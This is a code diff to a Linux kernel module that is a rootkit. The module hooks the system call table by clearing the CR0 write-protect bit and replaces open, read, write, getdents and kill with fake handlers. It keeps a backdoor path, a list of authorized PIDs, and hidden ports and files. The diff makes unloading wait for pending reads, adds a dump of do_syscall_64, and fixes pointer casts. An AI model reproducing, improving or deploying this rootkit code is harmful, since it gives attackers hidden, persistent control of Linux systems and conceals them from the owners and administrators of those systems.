@@ -16,6 +16,7 @@
 #include <linux/syscalls.h>
 #include <linux/utsname.h>
 #include <linux/socket.h>
+#include <asm/atomic.h>
 //~ #include <arpa/inet.h>
 #include <asm/current.h>
 #include <asm/segment.h>
@@ -917,6 +918,7 @@ static char pid_backdoor_str[12]= {'\0'};
 static pid_t authorized_pids[MAX_PIDS] = {0};
 static size_t authorized_pids_cnt = 0;
 
+atomic_t read_on;
 
 static const char* hidden_port[2] = {
     "0100007F:0462",    // 127.0.0.1:1122
@@ -964,6 +966,7 @@ const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0
 
 //How to find the syscall address and not in hardcoded
 unsigned long * sys_call = NULL;
+unsigned long * do_syscall64 = NULL;
 
 // Original functions
 asmlinkage int (*original_sys_open) (const char *pathname, int flags);
@@ -1033,6 +1036,22 @@ unsigned long *find_sys_call_table(void)
         return table;
     }
     return NULL;
+}
+
+void dump_do_syscall(void)
+{
+    int i = 0;
+    unsigned char dump[512];
+
+    if(!do_syscall64)
+        return;
+
+    memcpy(dump, do_syscall64, sizeof(dump));
+    for(i = 0; i < 512; i++)
+    {
+        printk("%.2x", dump[i]);
+    }
+    return;
 }
 
 #else
@@ -1361,7 +1380,9 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     if(index == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
         return read;
 
+    atomic_set(&read_on, 1);
     read = filter_vip_file((char*) buf, count, read, index);
+    atomic_set(&read_on, 0);
 
     vip_filenames[index].fd = -1;
 
@@ -1414,7 +1435,7 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     unsigned long           lost_data   = 0;
     char                    * buf;
     char                    d_type;
-    char                    logs[LOGS_SIZE];
+    //~ char                    logs[LOGS_SIZE];
     struct linux_dirent *   dir         = NULL;
     struct linux_dirent *   prev        = NULL;
     int                     nread       = 0;
@@ -1509,6 +1530,8 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 static int __init lkm_init(void)
 {
+    atomic_set(&read_on, 0);
+
     sys_call = (unsigned long *)find_sys_call_table();
 
     if(!sys_call)
@@ -1526,21 +1549,24 @@ static int __init lkm_init(void)
     else
         printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);
 
-    original_sys_open       = sys_call[__NR_open];
-    original_sys_read       = sys_call[__NR_read];
-    original_sys_write      = sys_call[__NR_write];
-    original_sys_close      = sys_call[__NR_close];
-    original_sys_getdents   = sys_call[__NR_getdents];
-    original_sys_kill       = sys_call[__NR_kill];
-    original_sys_getpid     = sys_call[__NR_getpid];
-    original_sys_getppid    = sys_call[__NR_getppid];
-    original_sys_unlink     = sys_call[__NR_unlink];
+    do_syscall64 =(unsigned long *)kallsyms_lookup_name("do_syscall_64");
+    dump_do_syscall();
+
+    original_sys_open       = (void*)sys_call[__NR_open];
+    original_sys_read       = (void*)sys_call[__NR_read];
+    original_sys_write      = (void*)sys_call[__NR_write];
+    original_sys_close      = (void*)sys_call[__NR_close];
+    original_sys_getdents   = (void*)sys_call[__NR_getdents];
+    original_sys_kill       = (void*)sys_call[__NR_kill];
+    original_sys_getpid     = (void*)sys_call[__NR_getpid];
+    original_sys_getppid    = (void*)sys_call[__NR_getppid];
+    original_sys_unlink     = (void*)sys_call[__NR_unlink];
     write_cr0(read_cr0() & (~0x10000));
-    sys_call[__NR_open]     = fake_sys_open;
-    sys_call[__NR_write]    = fake_sys_write;
-    sys_call[__NR_read]     = fake_sys_read;
-    sys_call[__NR_getdents] = fake_sys_getdents;
-    sys_call[__NR_kill]     = fake_sys_kill;
+    sys_call[__NR_open]     = (unsigned long)fake_sys_open;
+    sys_call[__NR_write]    = (unsigned long)fake_sys_write;
+    sys_call[__NR_read]     = (unsigned long)fake_sys_read;
+    sys_call[__NR_getdents] = (unsigned long)fake_sys_getdents;
+    sys_call[__NR_kill]     = (unsigned long)fake_sys_kill;
     write_cr0(read_cr0() | (0x10000));
     printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
     return 0;
@@ -1557,12 +1583,19 @@ static void __exit lkm_exit(void)
         printk("[%s] Successful remove %s", __this_module.name, BACKDOOR_PATH);
 
     write_cr0(read_cr0() & (~0x10000));
-    sys_call[__NR_open]     = original_sys_open;
-    sys_call[__NR_write]     = original_sys_write;
-    sys_call[__NR_read]     = original_sys_read;
-    sys_call[__NR_getdents] = original_sys_getdents;
-    sys_call[__NR_kill]     = original_sys_kill;
+    sys_call[__NR_getdents] = (unsigned long)original_sys_getdents;
+    sys_call[__NR_kill]     = (unsigned long)original_sys_kill;
     write_cr0(read_cr0() | (0x10000));
+
+    // Wait until all read are done
+    while(atomic_read(&read_on) != 0) schedule();
+
+    write_cr0(read_cr0() & (~0x10000));
+    sys_call[__NR_open]     = (unsigned long)original_sys_open;
+    sys_call[__NR_write]     = (unsigned long)original_sys_write;
+    sys_call[__NR_read]     = (unsigned long)original_sys_read;
+    write_cr0(read_cr0() | (0x10000));
+
     printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
 }
 
